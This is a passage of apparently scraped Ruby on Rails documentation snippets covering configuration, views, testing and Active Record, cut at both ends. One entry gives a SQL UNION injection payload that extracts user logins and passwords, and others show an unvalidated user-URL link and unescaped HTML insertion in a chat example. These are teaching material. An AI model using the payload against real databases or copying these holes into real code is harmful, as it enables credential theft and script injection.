# Equivalent of render :partial => 'articles/_article',
# :collection => @articles
render @articles

----------------------------------------

TITLE: Accessing Loaded Configuration Values
DESCRIPTION: Demonstrates how to access configuration values that were loaded from a YAML file using Rails.configuration.

LANGUAGE: ruby
CODE:
Rails.configuration.payment["merchant_id"] # => production_merchant_id or development_merchant_id

----------------------------------------

TITLE: Demonstrating String#constantize Method in Ruby on Rails
DESCRIPTION: Examples showing how constantize resolves constant references from strings, converting string class names to actual class objects.

LANGUAGE: ruby
CODE:
"Integer".constantize # => Integer

module M
  X = 1
end
"M::X".constantize # => 1

----------------------------------------

TITLE: Configuring Active Job Queue Adapter in Application Configuration
DESCRIPTION: Demonstrates how to set the default queue adapter for Active Job in the Rails application configuration. This example configures the application to use Sidekiq as the backend.

LANGUAGE: ruby
CODE:
# config/application.rb
module YourApp
  class Application < Rails::Application
    # Be sure to have the adapter's gem in your Gemfile
    # and follow the adapter's specific installation
    # and deployment instructions.
    config.active_job.queue_adapter = :sidekiq
  end
end

----------------------------------------

TITLE: Configuring MessagePack as Cache Serializer
DESCRIPTION: Example demonstrating how to configure MessagePack as the serializer for Rails caching, both globally and for individual cache stores.

LANGUAGE: ruby
CODE:
config.cache_store = :file_store, "tmp/cache", { serializer: :message_pack }

# Or individually:
ActiveSupport::Cache.lookup_store(:file_store, "tmp/cache", serializer: :message_pack)

----------------------------------------

TITLE: Configuring Global Encryption Context in Ruby on Rails
DESCRIPTION: Shows how to configure the global encryption context for ActiveRecord encryption by setting the key provider and encryptor in the application configuration files.

LANGUAGE: ruby
CODE:
config.active_record.encryption.key_provider = ActiveRecord::Encryption::EnvelopeEncryptionKeyProvider.new
config.active_record.encryption.encryptor = MyEncryptor.new

----------------------------------------

TITLE: Using Double Splat with Strict Locals in Rails Partials
DESCRIPTION: Shows how to allow optional local variable arguments using the double splat operator (**) in the strict locals signature, making the partial more flexible.

LANGUAGE: erb
CODE:

<%# app/views/messages/_message.html.erb %>

<%# locals: (message: "Hello, world!", **attributes) -%>
<%= tag.p(message, **attributes) %>

----------------------------------------

TITLE: Using assert_queries_count for Testing SQL Query Count in Rails
DESCRIPTION: Tests that a block generates a specific number of SQL queries, with option to include or exclude schema queries.

LANGUAGE: ruby
CODE:
assert_queries_count(count = nil, include_schema: false, &block)

----------------------------------------

TITLE: Creating a Reusable Form Partial in Rails ERB
DESCRIPTION: Extracts the product form into a partial view that can be reused for both new and edit actions. Uses local variables instead of instance variables for better reusability.

LANGUAGE: erb
CODE:
<%= form_with model: product do |form| %>
  <div>
    <%= form.label :name %>
    <%= form.text_field :name %>
  </div>

  <div>
    <%= form.submit %>
  </div>
<% end %>

----------------------------------------

TITLE: Using Database URL in YAML Configuration
DESCRIPTION: Configures a database connection using a URL within the database.yml file. This approach allows specifying the entire connection string in a single configuration value.

LANGUAGE: yaml
CODE:
development:
  url: postgresql://localhost/blog_development?pool=5

----------------------------------------

TITLE: Params Structure with IDs for Existing Records
DESCRIPTION: Demonstrates how fields_for includes id fields for existing records in the params hash. This allows Rails to update existing records rather than creating new ones.

LANGUAGE: ruby
CODE:
{
  "person" => {
    "name" => "John Doe",
    "addresses_attributes" => {
      "0" => {
        "id" => 1,
        "kind" => "Home",
        "street" => "221b Baker Street"
      },
      "1" => {
        "id" => "2",
        "kind" => "Office",
        "street" => "31 Spooner Street"
      }
    }
  }
}

----------------------------------------

TITLE: Generating User-Friendly Error Messages in Rails
DESCRIPTION: Shows how to generate user-friendly error messages from validation errors. The full_messages method converts technical validation errors into human-readable messages suitable for display in a user interface.

LANGUAGE: irb
CODE:
store(dev)> product.errors.full_messages
=> ["Name can't be blank"]

----------------------------------------

TITLE: Implementing Class Method for Acts As Yaffle
DESCRIPTION: Implementation of the acts_as_yaffle class method with configuration options. This shows how to add configurable class methods to models through a plugin.

LANGUAGE: ruby
CODE:
# yaffle/lib/yaffle/acts_as_yaffle.rb

module Yaffle
  module ActsAsYaffle
    extend ActiveSupport::Concern

    class_methods do
      def acts_as_yaffle(options = {})
        cattr_accessor :yaffle_text_field, default: (options[:yaffle_text_field] || :last_squawk).to_s
      end
    end
  end
end

----------------------------------------

TITLE: Defining as_json Method for JSON Serialization in Ruby
DESCRIPTION: Example of defining an as_json method in a class to customize JSON serialization. This class method returns a hash that will be used for JSON generation.

LANGUAGE: ruby
CODE:
class FooBar
  def as_json(options = nil)
    { foo: "bar" }
  end
end

----------------------------------------

TITLE: Enabling Asset Pipeline in config/application.rb
DESCRIPTION: Adds configuration options to enable the asset pipeline in the Rails application and sets the asset version.

LANGUAGE: ruby
CODE:
config.assets.enabled = true
config.assets.version = "1.0"

----------------------------------------

TITLE: Testing Time-Dependent Code with travel_to Helper in Rails
DESCRIPTION: Demonstrates using the travel_to helper to test time-sensitive code by temporarily stubbing the current date, allowing verification of functionality at specific points in time.

LANGUAGE: ruby
CODE:
# Given a user is eligible for gifting a month after they register.
user = User.create(name: "Gaurish", activation_date: Date.new(2004, 10, 24))
assert_not user.applicable_for_gifting?

travel_to Date.new(2004, 11, 24) do
  # Inside the `travel_to` block `Date.current` is stubbed
  assert_equal Date.new(2004, 10, 24), user.activation_date
  assert user.applicable_for_gifting?
end

# The change was visible only inside the `travel_to` block.
assert_equal Date.new(2004, 10, 24), user.activation_date

----------------------------------------

TITLE: Customizing Attachment Partial Path in User Model
DESCRIPTION: Example of overriding the default partial path for an attachable User by implementing to_attachable_partial_path method.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  def to_attachable_partial_path
    "users/attachable"
  end
end

----------------------------------------

TITLE: Using to_sentence in Ruby on Rails Array extensions
DESCRIPTION: The to_sentence method turns an array into a string containing a sentence that enumerates its items. It accepts options to customize the connectors between elements. Defined in active_support/core_ext/array/conversions.rb.

LANGUAGE: ruby
CODE:
%w().to_sentence                # => ""
%w(Earth).to_sentence           # => "Earth"
%w(Earth Wind).to_sentence      # => "Earth and Wind"
%w(Earth Wind Fire).to_sentence # => "Earth, Wind, and Fire"

----------------------------------------

TITLE: Basic Generated UserMailer Class Definition
DESCRIPTION: The basic structure of a generated UserMailer class that inherits from ApplicationMailer. This is the base template created by the Rails generator.

LANGUAGE: ruby
CODE:
# app/mailers/user_mailer.rb
class UserMailer < ApplicationMailer
end

----------------------------------------

TITLE: Configuration for Reverse Callback Ordering
DESCRIPTION: Configuration option to revert to the pre-Rails 7.1 behavior where transactional callbacks run in reverse order of definition.

LANGUAGE: ruby
CODE:
config.active_record.run_after_transaction_callbacks_in_order_defined = false

----------------------------------------

TITLE: Finding Objects in has_many Collection by ID in Rails
DESCRIPTION: Example of finding specific objects within a has_many collection using their primary key. This retrieves a book with ID 1 from the author's books.

LANGUAGE: ruby
CODE:
@available_book = @author.books.find(1)

----------------------------------------

TITLE: Using Custom Identifiers in Rails URL Helpers
DESCRIPTION: Shows how a custom to_param implementation affects the construction of URLs with route helpers. This example demonstrates generating an edit path using a custom identifier.

LANGUAGE: ruby
CODE:
irb> video = Video.find_by(identifier: "Roman-Holiday")
irb> edit_video_path(video)
=> "/videos/Roman-Holiday/edit"

----------------------------------------

TITLE: Using assert_no_difference for Testing Numeric Stability in Ruby
DESCRIPTION: Asserts that the numeric result of evaluating an expression remains unchanged before and after invoking the passed block.

LANGUAGE: ruby
CODE:
assert_no_difference(expressions, message = nil, &block)

----------------------------------------

TITLE: Implementing Rackup::Server#build_app Method for Middleware Stack in Ruby
DESCRIPTION: The build_app method that applies middleware to the Rails application, creating the full middleware stack in reverse order.

LANGUAGE: ruby
CODE:
module Rackup
  class Server
    private
      def build_app(app)
        middleware[options[:environment]].reverse_each do |middleware|
          middleware = middleware.call(self) if middleware.respond_to?(:call)
          next unless middleware
          klass, *args = middleware
          app = klass.new(app, *args)
        end
        app
      end
  end
end

----------------------------------------

TITLE: Displaying Inline Images in HTML Email Templates
DESCRIPTION: HTML+ERB template code showing how to display inline attachments in an HTML email. The attachments hash provides access to the image URL which can be used with image_tag.

LANGUAGE: html+erb
CODE:
<p>Hello there, this is the image you requested:</p>

<%= image_tag attachments['image.jpg'].url %>

----------------------------------------

TITLE: Implementing Concurrency Controls in Active Job
DESCRIPTION: Example of using Solid Queue's concurrency controls to limit how many jobs of a certain type can run simultaneously. This example limits jobs to 2 concurrent executions per account for 5 minutes.

LANGUAGE: ruby
CODE:
class MyJob < ApplicationJob
  limits_concurrency to: 2, key: ->(contact) { contact.account }, duration: 5.minutes

  def perform(contact)
    # perform job logic
  end
end

----------------------------------------

TITLE: Setting Up Server and Initial Deployment with Kamal
DESCRIPTION: Command to configure the server and perform the first deployment of a Rails application using Kamal.

LANGUAGE: bash
CODE:
$ bin/kamal setup

----------------------------------------

TITLE: Configuring JSON Time Precision in Rails
DESCRIPTION: Setting the time precision for JSON encoding of time objects. This initializer code removes millisecond precision from time objects when they are serialized to JSON.

LANGUAGE: ruby
CODE:
ActiveSupport::JSON::Encoding.time_precision = 0

----------------------------------------

TITLE: Rendering Names with ERB Template
DESCRIPTION: Example of an ERB template using both execution tags (<% %>) for loops and output tags (<%= %>) for displaying values.

LANGUAGE: html+erb
CODE:
<h1>Names</h1>
<% @people.each do |person| %>
  Name: <%= person.name %><br>
<% end %>

----------------------------------------

TITLE: Configuring System Tests to Use Headless Chrome
DESCRIPTION: This configuration sets up system tests to use Chrome in headless mode, which runs the browser without a visible window. This is useful for CI environments.

LANGUAGE: ruby
CODE:
require "test_helper"

class ApplicationSystemTestCase < ActionDispatch::SystemTestCase
  driven_by :selenium, using: :headless_chrome
end

----------------------------------------

TITLE: Using Integer positive/negative check methods
DESCRIPTION: New query methods for Integers that complement the existing #zero? method by allowing for easy sign checking.

LANGUAGE: ruby
CODE:
Integer#positive?
Integer#negative?

----------------------------------------

TITLE: Tracking Previous Changes with previous_changes in Rails
DESCRIPTION: Shows how previous_changes returns a hash of attributes that were changed before the model was saved. Empty before saving, contains changes after saving.

LANGUAGE: irb
CODE:
irb> person.previous_changes
=> {}

irb> person.save
irb> person.previous_changes
=> {"first_name" => [nil, "Jane Doe"]}

----------------------------------------

TITLE: Creating a Custom Error Subscriber in Rails
DESCRIPTION: Implementation of a custom error subscriber class that can be registered with Rails' error reporter. It defines a report method that will be called when errors occur.

LANGUAGE: ruby
CODE:
# config/initializers/error_subscriber.rb
class ErrorSubscriber
  def report(error, handled:, severity:, context:, source: nil)
    MyErrorReportingService.report_error(error, context: context, handled: handled, level: severity)
  end
end

----------------------------------------

TITLE: Registering a Custom RSS Parser for View Testing in Rails
DESCRIPTION: Demonstrates how to register a custom RSS parser for testing rendered view content in Rails 7.1+. This allows transforming rendered string content into an object that can be easily tested.

LANGUAGE: ruby
CODE:
register_parser :rss, -> rendered { RSS::Parser.parse(rendered) }

test "renders RSS" do
  article = Article.create!(title: "Hello, world")

  render formats: :rss, partial: article

  assert_equal "Hello, world", rendered.rss.items.last.title
end

----------------------------------------

TITLE: Running System Tests in Rails
DESCRIPTION: Command to run system tests in Rails. Note that standard test command won't run system tests by default.

LANGUAGE: bash
CODE:
$ bin/rails test:system

----------------------------------------

TITLE: Demonstrating String#demodulize Method in Ruby on Rails
DESCRIPTION: Examples showing how demodulize extracts the rightmost part of a qualified constant name, removing any namespace information.

LANGUAGE: ruby
CODE:
"Product".demodulize                        # => "Product"
"Backoffice::UsersController".demodulize    # => "UsersController"
"Admin::Hotel::ReservationUtils".demodulize # => "ReservationUtils"
"::Inflections".demodulize                  # => "Inflections"
"".demodulize                               # => ""

----------------------------------------

TITLE: Rendering a Partial with Layout in ERB
DESCRIPTION: Example of rendering an article partial with a specified box layout in an ERB template, passing the article as a local variable.

LANGUAGE: html+erb
CODE:
<%# app/views/articles/show.html.erb %>
<%= render partial: 'article', layout: 'box', locals: { article: @article } %>

----------------------------------------

TITLE: Transforming Hash Values with deep_transform_values in Rails
DESCRIPTION: The deep_transform_values method returns a new hash with all values (including those in nested hashes and arrays) converted by the block operation. A destructive variant deep_transform_values! is also available.

LANGUAGE: ruby
CODE:
hash = { person: { name: "Rob", age: "28" } }

hash.deep_transform_values { |value| value.to_s.upcase }
# => {person: {name: "ROB", age: "28"}}

----------------------------------------

TITLE: Running Code After Bundle with after_bundle Method
DESCRIPTION: Example of registering a callback to be executed after gems are bundled and binstubs are generated using the after_bundle method, useful for version control setup.

LANGUAGE: ruby
CODE:
after_bundle do
  git :init
  git add: "."
  git commit: "-a -m 'Initial commit'"
end

----------------------------------------

TITLE: Using Nonce with ERB JavaScript Tag Helper
DESCRIPTION: This ERB example shows how to use the nonce attribute with javascript_tag helper in Rails views, allowing inline scripts to be permitted by a nonce-based Content Security Policy.

LANGUAGE: ruby
CODE:
<%= javascript_tag nonce: true do -%>
  alert('Hello, World!');
<% end -%>

----------------------------------------

TITLE: Defining Engine Routes in Ruby
DESCRIPTION: Shows how to define routes inside an engine using the Engine.routes.draw method, which isolates the routes from the host application to prevent naming conflicts.

LANGUAGE: ruby
CODE:
Blorgh::Engine.routes.draw do
  resources :articles
end

----------------------------------------

TITLE: Disabling Query Cache in Rails
DESCRIPTION: This configuration demonstrates how to completely disable Rails' query cache feature. By default, Rails caches query results in memory to avoid redundant database queries within the same request or job.

LANGUAGE: yaml
CODE:
development:
  adapter: mysql2
  query_cache: false

----------------------------------------

TITLE: Using ActiveModel::Attributes Objects in IRB Console
DESCRIPTION: This snippet demonstrates using a Person object with ActiveModel::Attributes, showing how attribute values are automatically cast to the defined types and how default values work.

LANGUAGE: ruby
CODE:
irb> person = Person.new

irb> person.name = "Jane"
irb> person.name
=> "Jane"

# Casts the string to a date set by the attribute
irb> person.date_of_birth = "2020-01-01"
irb> person.date_of_birth
=> Wed, 01 Jan 2020
irb> person.date_of_birth.class
=> Date

# Uses the default value set by the attribute
irb> person.active
=> true

# Casts the integer to a boolean set by the attribute
irb> person.active = 0
irb> person.active
=> false

----------------------------------------

TITLE: Basic Routes File for Full Engine
DESCRIPTION: Default routes file structure created when using the --full option for a Rails engine.

LANGUAGE: ruby
CODE:
Rails.application.routes.draw do
end

----------------------------------------

TITLE: Handling Clashing Named Routes in Rails 4.0
DESCRIPTION: Examples of route definitions that would cause clashing named routes in Rails 4.0, which now raises an ArgumentError when routes with the same name are defined.

LANGUAGE: ruby
CODE:
get "one" => "test#example", as: :example
get "two" => "test#example", as: :example

----------------------------------------

TITLE: Using Time.days_in_year to get year length
DESCRIPTION: Returns the number of days in the given year, or the current year if no argument is provided, accounting for leap years.

LANGUAGE: ruby
CODE:
Time.days_in_year
Time.days_in_year(2016) # Returns 366 for leap year

----------------------------------------

TITLE: Comparing HTML Strings with assert_dom_equal
DESCRIPTION: Example of using assert_dom_equal to compare a literal HTML string with the output from a Rails helper method. This is useful for testing helper methods that generate HTML.

LANGUAGE: ruby
CODE:
assert_dom_equal '<a href="http://www.further-reading.com">Read more</a>',
  link_to("Read more", "http://www.further-reading.com")

----------------------------------------

TITLE: Opening Rails Console for User Creation
DESCRIPTION: Command to open the Rails console for creating a user account.

LANGUAGE: bash
CODE:
$ bin/rails console

----------------------------------------

TITLE: Checking Regexp Multiline Flag in Rails
DESCRIPTION: The multiline? method checks whether a regular expression has the /m flag set, indicating whether the dot matches newlines. Rails uses this to enforce constraints in routing requirements.

LANGUAGE: ruby
CODE:
%r{.}.multiline?  # => false
%r{.}m.multiline? # => true

Regexp.new(".").multiline?                    # => false
Regexp.new(".", Regexp::MULTILINE).multiline? # => true

LANGUAGE: ruby
CODE:
def verify_regexp_requirements(requirements)
  # ...
  if requirement.multiline?
    raise ArgumentError, "Regexp multiline option is not allowed in routing requirements: #{requirement.inspect}"
  end
  # ...
end

----------------------------------------

TITLE: Generating a Mailer with a Specific Action
DESCRIPTION: A bash command that generates a User mailer with a welcome_email method already defined, combining the generation of both the mailer class and the specific action.

LANGUAGE: bash
CODE:
$ bin/rails generate mailer User welcome_email

----------------------------------------

TITLE: Using EXPLAIN with MySQL/MariaDB
DESCRIPTION: Shows how to use the explain method with the analyze option in MySQL or MariaDB to examine query execution. The output displays tabular information about the query plan including select type, table access methods, and row estimates.

LANGUAGE: ruby
CODE:
Customer.where(id: 1).joins(:orders).explain(:analyze)

LANGUAGE: sql
CODE:
ANALYZE SELECT `shop_accounts`.* FROM `shop_accounts` INNER JOIN `customers` ON `customers`.`id` = `shop_accounts`.`customer_id` WHERE `shop_accounts`.`id` = 1
+----+-------------+-------+------+---------------+------+---------+------+------+--------+----------+------------+--------------------------------+
| id | select_type | table | type | possible_keys | key  | key_len | ref  | rows | r_rows | filtered | r_filtered | Extra                          |
+----+-------------+-------+------+---------------+------+---------+------+------+--------+----------+------------+--------------------------------+
|  1 | SIMPLE      | NULL  | NULL | NULL          | NULL | NULL    | NULL | NULL | NULL   | NULL     | NULL       | no matching row in const table |
+----+-------------+-------+------+---------------+------+---------+------+------+--------+----------+------------+--------------------------------+
1 row in set (0.00 sec)

----------------------------------------

TITLE: Data Theft with SQL UNION Injection
DESCRIPTION: Demonstrates how SQL UNION injection can be used to extract unauthorized data (user credentials) by appending an additional query to the original.

LANGUAGE: sql
CODE:
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'

----------------------------------------

TITLE: Using Week Boundary Methods in Ruby on Rails
DESCRIPTION: Example of using beginning_of_week and end_of_week methods to find the start and end dates of a week, with options to specify which day the week starts on.

LANGUAGE: ruby
CODE:
d = Date.new(2010, 5, 8)     # => Sat, 08 May 2010
d.beginning_of_week          # => Mon, 03 May 2010
d.beginning_of_week(:sunday) # => Sun, 02 May 2010
d.end_of_week                # => Sun, 09 May 2010
d.end_of_week(:sunday)       # => Sat, 08 May 2010

----------------------------------------

TITLE: Creating a Box Layout Partial in ERB
DESCRIPTION: A simple partial layout that wraps yielded content in a div with 'box' class. Used to provide consistent styling for various content elements.

LANGUAGE: html+erb
CODE:
<%# app/views/articles/_box.html.erb %>
<div class="box">
  <%= yield %>
</div>

----------------------------------------

TITLE: Namespaced Engine Class for Mountable Engine
DESCRIPTION: Engine initialization file with namespace isolation created when using the --mountable option.

LANGUAGE: ruby
CODE:
module Blorgh
  class Engine < ::Rails::Engine
    isolate_namespace Blorgh
  end
end

----------------------------------------

TITLE: Passing Parameters and Handling Received Data in JavaScript
DESCRIPTION: Demonstrates passing parameters to a channel subscription and handling received data. This example creates a chat interface that formats and displays messages.

LANGUAGE: javascript
CODE:
// app/javascript/channels/chat_channel.js
import consumer from "./consumer"

consumer.subscriptions.create({ channel: "ChatChannel", room: "Best Room" }, {
  received(data) {
    this.appendLine(data)
  },

  appendLine(data) {
    const html = this.createLine(data)
    const element = document.querySelector("[data-chat-room='Best Room']")
    element.insertAdjacentHTML("beforeend", html)
  },

  createLine(data) {
    return `
      <article class="chat-line">
        <span class="speaker">${data["sent_by"]}</span>
        <span class="body">${data["body"]}</span>
      </article>
    `
  }
})

----------------------------------------

TITLE: Including Test Helpers in Parent Test Classes
DESCRIPTION: Example of including a test helper in a parent test class in test_helper.rb, making it available to all subclasses.

LANGUAGE: ruby
CODE:
# test/test_helper.rb
require "test_helpers/sign_in_helper"

class ActionDispatch::IntegrationTest
  include SignInHelper
end

----------------------------------------

TITLE: Reloading Cached Associations in Rails
DESCRIPTION: Shows how to reload an association's cache when the data might have been changed by another part of the application, ensuring fresh data is used.

LANGUAGE: ruby
CODE:
# retrieves books from the database
author.books.load

# uses the cached copy of books
author.books.size

# discards the cached copy of books and goes back to the database
author.books.reload.empty?

----------------------------------------

TITLE: Enabling Development Caching in Rails
DESCRIPTION: Shows the command to enable caching in the Rails development environment. This allows testing cache functionality without deploying to production.

LANGUAGE: bash
CODE:
$ bin/rails dev:cache

----------------------------------------

TITLE: Defining Callbacks with a Class in ActiveModel
DESCRIPTION: This snippet demonstrates how to use a separate class to define callbacks in ActiveModel. It shows creating a PersonCallbacks class that defines a before_create method which gets triggered when a Person object is created.

LANGUAGE: ruby
CODE:
class Person
  extend ActiveModel::Callbacks

  define_model_callbacks :create
  before_create PersonCallbacks
end

class PersonCallbacks
  def self.before_create(obj)
    # `obj` is the Person instance that the callback is being called on
  end
end

----------------------------------------

TITLE: Creating Forms for External Resources without Authentication
DESCRIPTION: Demonstrates how to disable Rails' authenticity token when creating a form for an external API that doesn't require it, by passing false to the authenticity_token option.

LANGUAGE: erb
CODE:
<%= form_with url: 'http://farfar.away/form', authenticity_token: false do %>
  Form contents
<% end %>

----------------------------------------

TITLE: Inefficient String Logging in Ruby on Rails
DESCRIPTION: This snippet demonstrates a performance-inefficient way of logging in Rails that causes unnecessary string interpolation even when debug level is not enabled.

LANGUAGE: ruby
CODE:
logger.debug "Person attributes hash: #{@person.attributes.inspect}"

----------------------------------------

TITLE: Creating namespaced Rake tasks in Rails
DESCRIPTION: Group related Rake tasks using namespaces to organize them logically. This example creates a task in the db namespace, which will be invoked as db:nothing.

LANGUAGE: ruby
CODE:
namespace :db do
  desc "This task does nothing"
  task :nothing do
    # Seriously, nothing
  end
end

----------------------------------------

TITLE: Installing Rails Upgrade Plugin for Migration to Rails 3
DESCRIPTION: Shows how to install the Rails Upgrade plugin that helps automate the upgrade process from Rails 2.x to Rails 3.0 by checking for required updates and generating migration files.

LANGUAGE: bash
CODE:
$ ruby script/plugin install git://github.com/rails/rails_upgrade.git

----------------------------------------

TITLE: Generated Reference/Association Migration in Ruby on Rails
DESCRIPTION: This migration adds a foreign key reference to the user table in the products table. It creates a user_id column with an index and foreign key constraint.

LANGUAGE: ruby
CODE:
class AddUserRefToProducts < ActiveRecord::Migration[8.1]
  def change
    add_reference :products, :user, null: false, foreign_key: true
  end
end

----------------------------------------

TITLE: Enabling Autoloader Logging for Debugging
DESCRIPTION: Configures Rails autoloaders to log their activity to standard output, useful for debugging autoloading issues and understanding how the loaders are processing files.

LANGUAGE: ruby
CODE:
Rails.autoloaders.log!

----------------------------------------

TITLE: Implementing Flash Message in Controller Action
DESCRIPTION: Shows how to implement a flash message in a controller create action that the test is expecting.

LANGUAGE: ruby
CODE:
def create
  @article = Article.new(article_params)

  if @article.save
    flash[:notice] = "Article was successfully created."
    redirect_to @article
  else
    render "new"
  end
end

----------------------------------------

TITLE: Using camelize with lower Option in Ruby on Rails
DESCRIPTION: Example showing how camelize can produce lowerCamelCase format by passing the :lower option, useful for JavaScript-style naming.

LANGUAGE: ruby
CODE:
"visual_effect".camelize(:lower) # => "visualEffect"

----------------------------------------

TITLE: Default Values with Strict Locals in Rails Partials
DESCRIPTION: Shows how to set default values for local variables in partials using the strict locals syntax, allowing the partial to be rendered without specifying all locals.

LANGUAGE: erb
CODE:
<%# app/views/messages/_message.html.erb %>

<%# locals: (message: "Hello, world!") -%>
<%= message %>

LANGUAGE: ruby
CODE:
render "messages/message"
# => "Hello, world!"

----------------------------------------

TITLE: Running Migrations in a Specific Environment
DESCRIPTION: This command runs migrations against a specific Rails environment using the RAILS_ENV environment variable.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate RAILS_ENV=test

----------------------------------------

TITLE: Example of First Record with Composite Primary Key Ordering
DESCRIPTION: Demonstrates how Product.first orders results based on all columns in the composite primary key.

LANGUAGE: ruby
CODE:
irb> product = Product.first
=> #<Product store_id: 1, sku: "ABC98765", description: "Red Hat">

----------------------------------------

TITLE: Configuring PostgreSQL or MySQL for Solid Cache in database.yml
DESCRIPTION: Example configuration for using a relational database like MySQL or PostgreSQL for Solid Cache in production. This setup creates a dedicated database for caching with references to the primary database configuration.

LANGUAGE: yaml
CODE:
production:
  primary: &primary_production
    <<: *default
    database: app_production
    username: app
    password: <%= ENV["APP_DATABASE_PASSWORD"] %>
  cache:
    <<: *primary_production
    database: app_production_cache
    migrations_paths: db/cache_migrate

----------------------------------------

TITLE: Overriding Feature-Policy in a Controller
DESCRIPTION: Demonstrates how to override the globally configured permissions policy on a per-resource basis in a controller. This example specifically configures the geolocation policy for a specific controller.

LANGUAGE: ruby
CODE:
class PagesController < ApplicationController
  permissions_policy do |policy|
    policy.geolocation "https://example.com"
  end
end

----------------------------------------

TITLE: Using assert_response for Testing HTTP Status Codes in Rails
DESCRIPTION: Tests that the response comes with a specific status code, using either symbolic status or explicit number.

LANGUAGE: ruby
CODE:
assert_response(type, message = nil)

----------------------------------------

TITLE: Formatting Example Results in Ruby Documentation
DESCRIPTION: Shows how to properly format the results of code examples using the '# =>' syntax, with proper alignment.

LANGUAGE: ruby
CODE:
# For checking if an integer is even or odd.
#
#   1.even? # => false
#   1.odd?  # => true
#   2.even? # => true
#   2.odd?  # => false

----------------------------------------

TITLE: Using attributes= Method with ActiveModel::AttributeAssignment
DESCRIPTION: This snippet demonstrates using the attributes= method, which is an alias for assign_attributes provided by ActiveModel::AttributeAssignment, to set multiple attributes at once.

LANGUAGE: ruby
CODE:
irb> person = Person.new

irb> person.attributes = { name: "John", date_of_birth: "1998-01-01", active: false }

irb> person.name
=> "John"
irb> person.date_of_birth
=> "1998-01-01"

----------------------------------------

TITLE: Setting the Root Route in a Rails Engine
DESCRIPTION: This code sets the root path of the engine to the articles index action, allowing users to see all articles by visiting the root of the mounted engine path.

LANGUAGE: ruby
CODE:
root to: "articles#index"

----------------------------------------

TITLE: Creating a Custom Helper Generator in Ruby on Rails
DESCRIPTION: A Ruby class that defines a custom helper generator to replace Rails' built-in helper generator. This generator creates helper files with custom content.

LANGUAGE: ruby
CODE:
class Rails::MyHelperGenerator < Rails::Generators::NamedBase
  def create_helper_file
    create_file "app/helpers/#{file_name}_helper.rb", <<~RUBY
      module #{class_name}Helper
        # I'm helping!
      end
    RUBY
  end
end

----------------------------------------

TITLE: Using serializable_hash with include Option for Nested Objects in Rails
DESCRIPTION: Shows how to use the include option with serializable_hash to include associated objects in the serialized output with filtering options.

LANGUAGE: irb
CODE:
irb> note = Note.new
irb> note.title = "Weekend Plans"
irb> note.text = "Some text here"

irb> person = Person.new
irb> person.name = "Napoleon"
irb> person.notes = [note]

irb> person.serializable_hash
=> {"name" => "Napoleon"}

irb> person.serializable_hash(include: { notes: { only: "title" }})
=> {"name" => "Napoleon", "notes" => [{"title" => "Weekend Plans"}]}

----------------------------------------

TITLE: Using Custom Validators with ActiveModel and ActiveRecord in Rails 3
DESCRIPTION: This snippet shows how to apply custom validators in both plain Ruby objects with ActiveModel::Validations and ActiveRecord models. It demonstrates using the :title validator alongside standard validators like :presence.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::Validations
  attr_accessor :title
  validates :title, :presence => true, :title => true
end

# Or for Active Record

class Person < ActiveRecord::Base
  validates :title, :presence => true, :title => true
end

----------------------------------------

TITLE: Vulnerable Link Creation with User-Provided URL
DESCRIPTION: Shows how a Rails view might render a user-provided URL, which could execute malicious JavaScript if the URL isn't properly validated.

LANGUAGE: ruby
CODE:
link_to "Homepage", @user.homepage

----------------------------------------

TITLE: Using Deeply Nested Namespaces with form_with
DESCRIPTION: Demonstrates how to target controllers in deeply nested namespaces using an array syntax with multiple namespace levels.

LANGUAGE: ruby
CODE:
form_with model: [:admin, :management, @article]

----------------------------------------

TITLE: Defining Basic Bi-directional Associations in Ruby on Rails
DESCRIPTION: Shows how to create a basic bi-directional association between Author and Book models in Rails. This example demonstrates a standard has_many/belongs_to relationship without custom options.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  has_many :books
end

class Book < ApplicationRecord
  belongs_to :author
end

----------------------------------------

TITLE: Configuring Multiple Deprecators Simultaneously in Rails
DESCRIPTION: Example demonstrating how to apply configuration settings to all deprecators in a collection at once. When the debug property is set at the collection level, it affects all contained deprecators.

LANGUAGE: ruby
CODE:
Rails.application.deprecators.debug = true

Rails.application.deprecators[:my_gem].debug
# => true

Rails.application.deprecators[:other_gem].debug
# => true

----------------------------------------

TITLE: Configuring SQLite3 Extensions in Rails
DESCRIPTION: This snippet shows how to enable SQLite extensions with the sqlite3 gem v2.4.0+. It demonstrates different ways to specify extensions including module names, filesystem paths, and dynamic Ruby code.

LANGUAGE: yaml
CODE:
development:
  adapter: sqlite3
  extensions:
    - SQLean::UUID                     # module name responding to `.to_path`
    - .sqlpkg/nalgeon/crypto/crypto.so # or a filesystem path
    - <%= AppExtensions.location %>    # or ruby code returning a path

----------------------------------------

TITLE: Creating Test Databases for Active Record
DESCRIPTION: Commands to create the test databases required for running Active Record tests. This creates databases for both MySQL and PostgreSQL with the correct character set and collation.

LANGUAGE: bash
CODE:
$ cd activerecord
$ bundle exec rake db:create

----------------------------------------

TITLE: Adding Production Host Authorization in Rails
DESCRIPTION: Shows how to manually permit allowed hosts in production environments to guard against header attacks. This is necessary since the hosts list is empty by default in non-development environments.

LANGUAGE: ruby
CODE:
Rails.application.config.hosts << "product.com"

----------------------------------------

TITLE: Registering Callbacks with Method Implementation in Ruby on Rails
DESCRIPTION: Demonstrates registering a callback using a macro-style class method that calls an ordinary method for implementation. This example shows a before_validation callback that ensures username has a value by using the email if username is blank.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  validates :username, :email, presence: true

  before_validation :ensure_username_has_value

  private
    def ensure_username_has_value
      if username.blank?
        self.username = email
      end
    end
end

----------------------------------------

TITLE: Running Database Migrations
DESCRIPTION: Shows how to execute pending database migrations using the Rails migrate command. This creates the necessary database tables based on the migration files.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate
==  CreateHighScores: migrating ===============================================
-- create_table(:high_scores)
   -> 0.0017s
==  CreateHighScores: migrated (0.0019s) ======================================

----------------------------------------

TITLE: Getting Attribute Change Details with changes in Rails
DESCRIPTION: Demonstrates the changes method which returns a hash with attribute names as keys and arrays of [original_value, new_value] as values. Useful for tracking both old and new values.

LANGUAGE: irb
CODE:
irb> person.changes
=> {"first_name" => [nil, "Jane Doe"]}

----------------------------------------

TITLE: Configuring Lib Directory for Autoloading
